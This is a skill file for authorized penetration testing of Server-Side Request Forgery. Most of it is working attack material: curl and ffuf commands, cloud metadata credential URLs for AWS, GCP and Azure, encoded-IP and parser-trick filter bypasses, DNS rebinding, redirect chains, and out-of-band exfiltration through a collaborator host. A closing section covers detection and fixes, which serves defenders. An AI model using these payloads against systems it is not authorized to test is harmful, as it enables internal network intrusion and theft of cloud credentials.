---
name: ssrf
description: Use when testing a web application for Server-Side Request
  Forgery on an authorized engagement. Covers finding server-fetched URL
  inputs, confirming outbound requests with a collaborator, reading cloud
  instance metadata (169.254.169.254), port scanning the internal network,
  and bypassing SSRF allow-lists and block-lists with parser tricks, DNS
  rebinding, redirects, and encoded IP forms. Use when parameters, webhooks,
  file uploads from URL, PDF generators, or image proxies let the server
  fetch a remote resource for you.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [webapp-pentest-methodology, recon-active, xxe]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
  - name: ffuf
    version: 2.1
---

Server-Side Request Forgery happens when the server fetches a URL that the
attacker controls, turning the server into a proxy into networks the
attacker cannot reach directly. This skill covers the full authorized
methodology: finding fetch points, confirming the request leaves the
server, exploiting cloud metadata, scanning internal networks, and beating
common filters. All testing targets systems you have written permission to
test.

## Quick Workflow

1. Map every feature where the server fetches a remote resource: URL
   parameters, webhooks, import-from-URL, avatar upload by URL, PDF or
   screenshot generators, feed readers, and document parsers.
2. Point the parameter at a collaborator or listener you control and
   confirm the server makes an outbound request.
3. Try the cloud metadata addresses (169.254.169.254 and provider
   variants) to identify the hosting environment.
4. Probe internal IPs and ports to map reachable services.
5. Test allow-list and block-list filters with parser differentials,
   redirects, DNS rebinding, and alternate IP encodings.
6. Escalate confirmed SSRF to file reads (file://), internal admin
   panels, and credential theft from metadata services.
7. For blind SSRF with no response, use time delays and out-of-band data
   exfiltration.
8. Record the exact payload, the observed outbound request, and the data
   returned.

## 1. Finding server-fetch inputs

Common SSRF sinks: `url=`, `image=`, `feed=`, `webhook=`, `callback=`,
`redirect=` (when fetched, not just redirected), avatar upload by URL,
"import from link", HTML-to-PDF converters, and link preview unfurlers.

```bash
# Quick probe: does the parameter reach the network? Point it at your
# collaborator domain and watch for a hit.
curl -s -X POST 'https://target.example/api/preview' \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://YOURID.oastify.com/probe1"}' | head -c 400
```

```bash
# Run a listener to catch the outbound request yourself
python3 -m http.server 8888 --bind 0.0.0.0 &
# Then point the SSRF parameter at http://YOUR-PUBLIC-IP:8888/callback
```

Burp Collaborator is the standard tool: every payload gets a unique
subdomain, and any DNS or HTTP hit proves the server resolved and
connected out. Keep a table of payload to collaborator subdomain so each
hit maps to the exact request that caused it.

## 2. Confirming and fingerprinting

Once a hit lands, learn what the fetcher is: follow redirects or not,
which schemes it accepts, and what it does with the response.

```bash
# Does it follow redirects? Point it at a URL you control that 302s
# elsewhere, and see which host gets the second hit.
# (Serve this with python http.server using a custom redirect handler,
# or use a simple PHP/Flask redirector on your VPS.)

# Which schemes are accepted? Try each and watch the collaborator.
for scheme in http https file ftp dict gopher; do
  echo "trying $scheme"
  curl -s -X POST 'https://target.example/api/preview' \
    -H 'Content-Type: application/json' \
    -d "{\"url\":\"$scheme://YOURID.oastify.com/$scheme\"}" -o /dev/null
done
```

`file://` reading `/etc/passwd` is the fastest high-impact proof when it
is allowed. `dict://` and `gopher://` matter only on old stacks (PHP
curl, old Java URL handlers); test them but do not assume they work.

## 3. Cloud metadata exploitation

If the target runs on a cloud provider, the metadata service hands out
credentials to whoever can reach it.

```bash
# AWS: does the SSRF fetch reach the metadata service?
# Point the vulnerable parameter at http://169.254.169.254/latest/meta-data/
# and read what comes back in the application response.

# If the app returns the fetched content, walk the metadata tree:
# http://169.254.169.254/latest/meta-data/iam/security-credentials/
# then http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# GCP (needs the Metadata-Flavor header; test if the fetcher lets you
# control headers, otherwise this fails):
# http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure:
# http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

Other addresses worth trying when 169.254.169.254 is blocked:

```bash
# Alternate encodings of 169.254.169.254 (also useful filter bypasses)
# decimal:    http://2852039166/
# octal:      http://0251.0376.0251.0376/
# hex:        http://0xa9.0xfe.0xa9.0xfe/
# mixed:      http://169.254.43518/      (169.254.(169*256+254))
#             http://0xa9fea9fe/
```

Stop at reading the role name and proving the credentials endpoint is
reachable. Do not exfiltrate live cloud keys beyond what the rules of
engagement allow; a screenshot of the role name plus the reachable token
URL is usually enough proof.

## 4. Internal network scanning

A confirmed SSRF is a port scanner with the server's network view. Scan
carefully and slowly to avoid tripping network alarms outside the agreed
scope.

```bash
# Port scan via response differences: open ports return faster or with
# different content than closed ones. Automate with ffuf against the SSRF
# parameter, varying the port.
ffuf -u 'https://target.example/api/preview' -X POST \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:FUZZ/"}' \
  -w /usr/share/seclists/Discovery/Infrastructure/common-ports.txt \
  -mc 200 -fs 0 -t 5 -p 0.5
```

```bash
# Sweep the likely internal range one host at a time, slowly
for host in 10.0.0.5 10.0.0.6 10.0.1.10 172.17.0.2; do
  curl -s -X POST 'https://target.example/api/preview' \
    -H 'Content-Type: application/json' \
    -d "{\"url\":\"http://$host:8080/\"}" -o /tmp/ssrf-$host.html \
    -w "$host -> %{http_code} %{size_download}b\n"
done
```

Interesting targets: admin panels on high ports (8080, 8443, 9090),
Elasticsearch (9200), Redis (6379), MongoDB (27017), Jenkins, and
internal APIs that trust the server's IP. Read banners from the fetched
content to identify services before interacting further.

## 5. Filter bypasses

Filters usually block by string matching. Beat them with parser
differentials, where the filter sees one host and the fetcher connects to
another.

```bash
# 1. Allow-list bypass with @ : filter sees the first host, fetcher
#    uses the part after the last @ as the real host
#    https://target.example@YOURID.oastify.com/

# 2. Allow-list bypass with #: fragment is stripped by the fetcher
#    https://target.example#@YOURID.oastify.com/

# 3. DNS rebinding: register a domain whose DNS alternates between a
#    public IP (passes the filter check) and 127.0.0.1 (used at fetch
#    time). Tools like rbndr.us automate the alternating answers.

# 4. Redirect bypass: filter checks the first URL, fetcher follows the
#    302 to the internal target
#    Point the parameter at https://your-server/redirect.php
#    which 302s to http://169.254.169.254/latest/meta-data/

# 5. Case and scheme tricks
#    HTTP://169.254.169.254/      (uppercase scheme)
#    http://0x7f.0x0.0x0.0x1/     (hex localhost)
#    http://2130706433/           (decimal localhost)
#    http://127.1/                (short form localhost)

# 6. Block-list bypass with URL encoding the filter does not decode
#    http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/

# 7. Enclosed alphanumerics or unicode dots the filter misses
#    (test only if the fetcher normalizes them; results vary by stack)
```

Always verify the bypass actually fetched the internal target by
watching the collaborator or reading returned content, not by guessing.

## 6. Blind SSRF exploitation

When the application never returns the fetched content, prove impact
out-of-band and with timing.

```bash
# Timing oracle: internal hosts respond at different speeds
time curl -s -X POST 'https://target.example/api/preview' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:22/"}' -o /dev/null
time curl -s -X POST 'https://target.example/api/preview' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:81/"}' -o /dev/null
```

```bash
# Out-of-band exfiltration: if the fetcher follows redirects, bounce the
# internal response through your server by chaining two SSRF calls, or use
# DNS exfiltration where the internal data becomes a subdomain:
# http://<data>.YOURID.oastify.com/  (works when the app echoes the URL
# into a DNS-resolving context; limited but sometimes enough)
```

For blind metadata theft, the redirect chain is the classic: the first
fetch hits your redirector, which 302s to the metadata URL, and some
fetchers then POST or GET the result back to you if you control the final
landing page logic. This is stack dependent, so test each hop with the
collaborator first.

## Edge cases

- The fetcher resolves DNS at filter time and connects by IP at fetch
  time (TOCTOU). DNS rebinding only works in this window; if the app
  caches the DNS result, rebinding fails.
- The application fetches the URL but only checks the Content-Type
  (image proxy). Try polyglot responses or check whether the proxy
  follows redirects to non-image URLs.
- IPv6: filters often forget `http://[::ffff:169.254.169.254]/` and
  `http://[0:0:0:0:0:ffff:169.254.169.254]/`. Test them.
- The SSRF only triggers asynchronously (webhook queue, scheduled
  import). The collaborator hit may arrive minutes later; wait and
  correlate by unique subdomain per payload.
- WAF blocks `169.254.169.254` as a string but not its integer forms.
  Rotate through the encodings in section 3.
- The fetcher is a headless browser (screenshot service): it renders
  JavaScript, so `file://` may be blocked but internal HTTP targets
  render fully, and you can read rendered content from the screenshot.

## Escalation

- Direct metadata IP blocked: try the DNS names
  (`instance-data` on some clouds, `metadata.google.internal` on GCP)
  and the alternate encodings.
- Only HTTP allowed: internal admin panels are usually HTTP anyway;
  pivot to those instead of file reads.
- Response is truncated: fetch `http://169.254.169.254/latest/meta-data/`
  first (small directory listing), then request single keys instead of
  large documents.
- The fetcher validates the URL with a HEAD request first: your bypass
  must survive both the check request and the real fetch.
- No outbound DNS: use raw IPs only, and exfiltrate through response
  content instead of the collaborator.
- Hitting a dead end on the app server: remember the SSRF runs with the
  server's identity, so internal services that trust the server subnet
  (monitoring dashboards, CI systems, cloud control planes) are the
  real targets, not just the app server itself.

## Detection and defender view

Defenders see SSRF as server-side outbound connections to internal or
metadata addresses that no legitimate feature should touch. Key signals:
egress firewall logs showing the app server connecting to 169.254.169.254
or RFC 1918 addresses, DNS queries for collaborator-style domains from
server hosts, and application logs recording user-supplied URLs that were
fetched. The durable fixes are an explicit allow-list of permitted fetch
destinations, blocking all private and link-local ranges at the egress
layer (not just in application code), disabling unused URL schemes
(`file://`, `gopher://`, `dict://`), not following redirects to internal
hosts, and requiring IMDSv2 (token-based metadata) on AWS so a bare GET
cannot steal credentials. Validate and normalize URLs with a real parser,
resolve DNS once, and connect to the resolved IP while re-validating it.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the initial
  fetch point.
- MITRE ATT&CK T1552.005 (Unsecured Credentials: Cloud Instance
  Metadata API): metadata theft.
- MITRE ATT&CK T1018 (Remote System Discovery): internal scanning.
- CWE-918 (Server-Side Request Forgery).
- CWE-20 (Improper Input Validation): filter bypass root cause.
- OWASP Testing Guide: Testing for Server-Side Request Forgery
  (OTG-INPVAL-016).
- OWASP Top 10 2021: A10 Server-Side Request Forgery.
- PortSwigger Web Security Academy: SSRF labs and cheat sheet.
- AWS docs: Instance Metadata Service Version 2 (IMDSv2).
